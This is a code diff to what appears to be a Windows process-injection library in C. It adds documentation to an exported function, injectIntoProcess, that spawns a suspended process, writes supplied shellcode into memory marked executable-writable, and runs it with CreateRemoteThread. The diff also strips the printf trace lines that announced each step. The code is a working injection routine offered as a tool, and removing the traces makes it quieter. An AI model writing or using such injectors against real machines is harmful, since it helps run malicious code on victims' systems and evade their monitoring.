@@ -3,6 +3,21 @@
 #include <stdio.h>
 #include "../include/injections.h"
 
+/*
+ * This function creates a process, injects shellcode into that process, and runs that shellcode
+ *
+ * Input:
+ *      BYTE[] shellcode: shellcode to inject and execute
+ *
+ *      SIZE_T dwShellcodeSize: size of the shellcode array
+ *
+ *      LPCSTR lpApplicationName: name of the application to create a process of
+ *
+ * Note:
+ *      The function uses a standard CreateProcessA, VirtualAllocEx,
+ *      WriteProcessMemory, and CreateRemoteThread execution flow. 
+ *      The memory is allocated with PAGE_EXECUTE_READWRITE protections and it doesn't revert the protection rights
+ */
 DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplicationName)
 {
     STARTUPINFOA si;
@@ -11,7 +26,6 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
 
-    printf("CreateProcessA\n");
     if (!CreateProcessA(lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         #ifdef DEBUG
         printf("CreateProcess failed (%d).\n", GetLastError());
@@ -19,7 +33,6 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
         return;
     }
 
-    printf("VirtualAllocEx\n");
     LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (remoteMemory == NULL) {
         #ifdef DEBUG
@@ -29,7 +42,6 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
         return;
     }
 
-    printf("WriteProcessMemory\n");
     SIZE_T bytesWritten;
     if (!WriteProcessMemory(pi.hProcess, remoteMemory,shellcode, dwShellcodeSize, &bytesWritten)) {
         #ifdef DEBUG
@@ -40,7 +52,6 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
         return;
     }
 
-    printf("CreateRemoteThread\n");
     HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
     if (hThread == NULL) {
         #ifdef DEBUG
